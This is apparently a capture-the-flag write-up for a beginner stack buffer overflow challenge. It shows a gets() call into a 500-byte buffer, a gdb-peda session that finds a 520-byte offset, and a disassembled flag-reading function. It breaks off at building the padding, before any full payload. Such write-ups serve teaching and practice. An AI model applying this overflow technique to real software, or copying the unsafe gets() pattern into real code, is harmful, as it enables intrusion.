### Chall Desc:
Here at BCA, we take fitness very seriously. Lately, our gym teachers have been stressing jumproping as cardio...  
I'm not too good at it yet though, but I think you might be able to show me how it's done!

### File attached: 
[src.c](src.c)  
[jumprope](jumprope)

#### Soln:

Firstly we need to find the vulnerability which is in the gets function in source code `src.c`.  
Code snippet  
```c
void jumprope(){
    char arr[500];
    printf("\nBetter start jumping!\n");
    gets(arr);
    printf("Woo, that was quite the workout wasn't it!\n");
}
```

So, we see that the character array is of 500 characters. Therefore we need to overflow it with something greater than that.

#### Firstly we create a dummy flag for testing and find the overflow offset of `'A'`
```c
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/jump$ ls
flag.txt  jumprope
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/jump$ ./jumprope
Here at BCA, fitness is one of our biggest priorities!
Today's workout is going to be jumproping. Enjoy!

Better start jumping!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woo, that was quite the workout wasn't it!
```

#### Now, we debug the function jumprope using `gdb` and overflow with something greater than 500 and then look for `rsp` function.
```c
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/jump$ gdb ./jumprope
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./jumprope...
(No debugging symbols found in ./jumprope)
gdb-peda$ pattern create 600
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs'
gdb-peda$ r
Starting program: /mnt/c/Users/Chaitanya K Chauhan/Dropbox/My PC (ckc)/Desktop/jump/jumprope
Here at BCA, fitness is one of our biggest priorities!
Today's workout is going to be jumproping. Enjoy!

Better start jumping!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs
Woo, that was quite the workout wasn't it!
```

#### This is what we get as the `SIGESV` function breakdown
```c
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x2b ('+')
RBX: 0x4012d0 --> 0x8d4c5741fa1e0ff3
RCX: 0xfffffffffffff506
RDX: 0x0
RSI: 0x7fffff78d723 --> 0x78e7e0000000000a
RDI: 0x7fffff78e7e0 --> 0x0
RBP: 0x4e73413873416973 ('siAs8AsN')
RSP: 0x7ffffffee248
RIP: 0x401259 --> 0x894855fa1e0ff3c3
R8 : 0x2b ('+')
R9 : 0x0
R10: 0xfffffffffffff506
R11: 0xfffffffffffff506
R12: 0x4010d0 --> 0x8949ed31fa1e0ff3
R13: 0x7ffffffee340
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401252 <jumprope+54>:      call   0x401080 <puts@plt>
   0x401257 <jumprope+59>:      nop
   0x401258 <jumprope+60>:      leave
=> 0x401259 <jumprope+61>:      ret
   0x40125a <main>:     endbr64
   0x40125e <main+4>:   push   rbp
   0x40125f <main+5>:   mov    rbp,rsp
   0x401262 <main+8>:   mov    rax,QWORD PTR [rip+0x2df7]        # 0x404060 <stdout@@GLIBC_2.2.5>
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x7ffffffee248
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401259 in jumprope ()
gdb-peda$ x/s 0x7ffffffee248
>>>
gdb-peda$ pattern offset AsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs
AsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs found at offset: 520
gdb-peda$ disass a
Dump of assembler code for function a:
   0x00000000004011b6 <+0>:     endbr64
   0x00000000004011ba <+4>:     push   rbp
   0x00000000004011bb <+5>:     mov    rbp,rsp
   0x00000000004011be <+8>:     sub    rsp,0x70
   0x00000000004011c2 <+12>:    lea    rsi,[rip+0xe3f]        # 0x402008
   0x00000000004011c9 <+19>:    lea    rdi,[rip+0xe3a]        # 0x40200a
   0x00000000004011d0 <+26>:    call   0x4010c0 <fopen@plt>
   0x00000000004011d5 <+31>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011d9 <+35>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004011de <+40>:    jne    0x4011f8 <a+66>
   0x00000000004011e0 <+42>:    lea    rdi,[rip+0xe31]        # 0x402018
   0x00000000004011e7 <+49>:    call   0x401080 <puts@plt>
   0x00000000004011ec <+54>:    lea    rdi,[rip+0xe55]        # 0x402048
   0x00000000004011f3 <+61>:    call   0x401080 <puts@plt>
   0x00000000004011f8 <+66>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011fc <+70>:    lea    rax,[rbp-0x70]
   0x0000000000401200 <+74>:    mov    esi,0x64
   0x0000000000401205 <+79>:    mov    rdi,rax
   0x0000000000401208 <+82>:    call   0x4010a0 <fgets@plt>
   0x000000000040120d <+87>:    lea    rax,[rbp-0x70]
   0x0000000000401211 <+91>:    mov    rdi,rax
   0x0000000000401214 <+94>:    call   0x401080 <puts@plt>
   0x0000000000401219 <+99>:    nop
   0x000000000040121a <+100>:   leave
   0x000000000040121b <+101>:   ret
End of assembler dump.
gdb-peda$ q
```

#### Now we create our `python exploit`
```c
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/jump$ python3
Python 3.8.10 (default, Mar 15 2022, 12:22:08)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 'A'*520
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```
